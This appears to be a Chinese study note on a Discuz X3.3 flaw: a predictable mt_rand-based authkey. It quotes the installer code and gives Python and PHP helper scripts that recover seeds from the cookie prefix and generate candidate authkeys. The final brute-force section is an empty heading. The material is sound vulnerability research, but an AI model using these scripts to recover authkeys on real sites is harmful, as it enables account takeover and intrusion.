[Discuz_X authkey安全性漏洞分析](https://lorexxar.cn/2017/08/31/dz-authkey/)

[Discuz X3.3 authkey生成算法的安全性漏洞和后台任意代码执行漏洞](https://www.seebug.org/vuldb/ssvid-96371)


之前分析了 php 随机数及 php_mt_seed 的使用。

    upload/install/index.php
    $authkey = substr(md5($_SERVER['SERVER_ADDR'].$_SERVER['HTTP_USER_AGENT'].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, 0, 6)), 8, 6).random(10);
    ...
    $_config['cookie']['cookiepre'] = random(4).'_';
    
    upload/install/include/install_function.php
    
    function random($length) {
        $hash = '';
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
        $max = strlen($chars) - 1;
        PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
        for($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }

    可以看到是从 chars 中随机的。
    
> 通过已知的4位，算出random使用的种子，进而得到authkey后10位。那剩下的就需要搞定前6位，根据其生成算法，只好选择爆破的方式，由于数量太大，就一定要选择一个本地爆破的方式（即使用到authkey而且加密后的结果是已知的）。
* 于是根据 cookie_pre 可以得到后面几次生成的随机数结果。  
* 使用 php_mt_seed 得到一些种子。
* 使用这些种子，可以生成对应的 authkey 的后 10 位。
* 利用各组 authkey 与重置密码的 sign 进行比较，得出 authkey


# python 生成参数

    def get_seeds(self):
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'
        index_list = []
        for c in self.cookie_pre:
            index_list.append(chars.index(c))
        print(f'cookie_pre 对应随机数结果为 {index_list}')
        # 4 个一组，共 10 组，忽略
        params = '0 ' * 4 * 10
        length = len(chars)
        for index in index_list:
            # 4 个一组，前 2 个给出输出结果的范围，后 2 个给传递给 mt_rand 的参数。
            params += f'{index} {index} 0 {length-1} '
        print(f'生成参数为 \n{params}')
# php 生成随机数
    <?php
    function random($length) {
        $hash = '';
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
        $max = strlen($chars) - 1;
        PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
        for ($i = 0; $i < $length; $i++) {
            $hash .= $chars[mt_rand(0, $max)];
        }
        return $hash;
    }

    $fp = fopen('seeds.txt', 'rb');
    $fp2 = fopen('authkey.txt', 'wb');
    while (!feof($fp)) {
        $line = fgets($fp);
        if (preg_match("/seed\s=\s.*?\s=\s(\d+)/", $line, $match)) {
            $seed = $match[1];
        } else {
            continue;
        }
        mt_srand($seed);
        $auth_key = random(10);
        fwrite($fp2, "seed=$seed,random auth key=$auth_key\n");
    }
    fclose($fp);
    fclose($fp2);
    echo '写入完成';
# python 爆破